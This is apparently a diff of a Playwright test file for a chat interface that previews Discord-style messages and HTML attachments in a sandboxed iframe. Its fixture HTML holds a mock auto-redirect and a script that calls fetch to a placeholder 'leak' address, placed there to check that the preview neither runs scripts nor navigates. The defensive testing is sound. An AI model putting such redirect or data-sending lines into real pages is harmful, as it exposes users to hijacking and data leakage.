@@ -20,7 +20,7 @@ async function fixture(page: Page, state: 'submitted' | 'unknown' = 'submitted',
     if (url.pathname.endsWith('/catalog')) return route.fulfill({ json: { entries: [{ kind: 'skill', name: 'research', description: 'Investigate primary sources' }, { kind: 'command', name: 'review', description: 'Review changes' }] } })
     if (url.pathname.endsWith('/messages') && historyGate) await historyGate
     if (url.pathname.endsWith('/messages')) return route.fulfill({ json: { cursor: 'test:0', before: null, stale: false, messages: [{ id: '100000000000000005', channel_id: threadId, author: { id: 'bot', username: 'Kimaki', bot: true }, timestamp: '2026-10-24T00:00:00Z', content: '## The approved Stream workspace\n\nThis is the **published Discord representation**, not a raw harness transcript.\n\n- Existing ThreadDeck typography and containers\n- One conversation and a durable Markdown draft\n- All execution stays inside Kimaki\n\n[Conversation guide](https://example.invalid/guide)', attachments: [{ id: '100000000000000006', filename: 'study.html', size: 400, content_type: 'text/html' }], components: [{ type: 17, accent_color: 0xf77c9d, components: [{ type: 10, content: 'A real Components V2 callout' }] }], embeds: [] }] } })
-    if (url.pathname.includes('/attachments/')) return route.fulfill({ contentType: 'text/html', body: '<html><head><meta http-equiv="refresh" content="0;url=https://example.invalid/escape"><script>fetch("https://example.invalid/leak")</script><style>body{background:#f4f3f6;color:#25212e;padding:48px;font:20px monospace}</style></head><body><h1>Safe attachment preview</h1><p>This is a synthetic HTML attachment.</p></body></html>' })
+    if (url.pathname.includes('/attachments/')) return route.fulfill({ contentType: 'text/html', body: '<html><head><meta http-equiv="refresh" content="0;url=https://example.invalid/escape"><script>fetch("https://example.invalid/leak")</script><style>@property --progress{syntax:"<percentage>";inherits:false;initial-value:100%}body{background:#f4f3f6;color:#25212e;padding:48px;font:20px monospace}</style></head><body><h1>Safe attachment preview</h1><p>This is a synthetic HTML attachment.</p></body></html>' })
     if (url.pathname === '/api/chat/submit') {
       const input = route.request().postDataJSON(); submissions.push(input)
       return route.fulfill({ status: 202, json: { id: input.requestId, state: 'accepted', messageIds: [], updatedAt: now } })
@@ -524,7 +524,7 @@ test('agent gallery images render thumbnails and enlarge without leaving chat', 
   const imageId = '100000000000000008'
   let thumbnailReady!: () => void
   const thumbnailGate = new Promise<void>(resolve => { thumbnailReady = resolve })
-  await page.route('**/api/chat/threads/*/messages', route => route.fulfill({ json: { cursor: 'image:0', before: null, stale: false, messages: [{ id: '100000000000000005', channel_id: '100000000000000003', timestamp: '2026-10-24T00:00:00Z', author: { id: 'bot', username: 'Kimaki', bot: true }, content: 'Here is the screenshot.', attachments: [], components: [{ type: 12, items: [{ media: { id: '100000000000000099', attachment_id: imageId, content_type: 'image/png', url: `https://media.discordapp.net/attachments/${threadId}/${imageId}/preview.png?ex=new` } }] }], embeds: [] }] } }))
+  await page.route('**/api/chat/threads/*/messages', route => route.fulfill({ json: { cursor: 'image:0', before: null, stale: false, messages: [{ id: '100000000000000005', channel_id: '100000000000000003', timestamp: '2026-10-24T00:00:00Z', author: { id: 'bot', username: 'Kimaki', bot: true }, content: 'Here is the screenshot.', attachments: [], components: [{ type: 12, items: [{ media: { id: '100000000000000099', attachment_id: imageId, content_type: 'image/png', url: `https://media.discordapp.net/attachments/${threadId}/${imageId}/preview.png?ex=new` }, description: null }] }], embeds: [] }] } }))
   await page.route(`**/attachments/${imageId}`, async route => {
     await thumbnailGate
     return route.fulfill({ contentType: 'image/png', headers: { 'Cache-Control': 'no-store' }, body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jRZkAAAAASUVORK5CYII=', 'base64') })
@@ -559,6 +559,8 @@ test('component-only HTML files expose the same safe preview as ordinary attachm
   await expect(page.getByText('View in Discord', { exact: true })).toHaveCount(0)
   await page.getByRole('button', { name: 'Preview HTML', exact: true }).click()
   await expect(page.frameLocator('iframe').getByRole('heading', { name: 'Safe attachment preview' })).toBeVisible()
+  await expect(page.frameLocator('iframe').locator('body')).toHaveCSS('font-family', 'monospace')
+  await expect(page.frameLocator('iframe').locator('body')).toHaveCSS('padding-top', '48px')
   await expect(page.locator('iframe')).toHaveAttribute('sandbox', '')
 })
 test('HTML occupies the chat pane without executing or navigating, then restores the draft', async ({ page }) => {
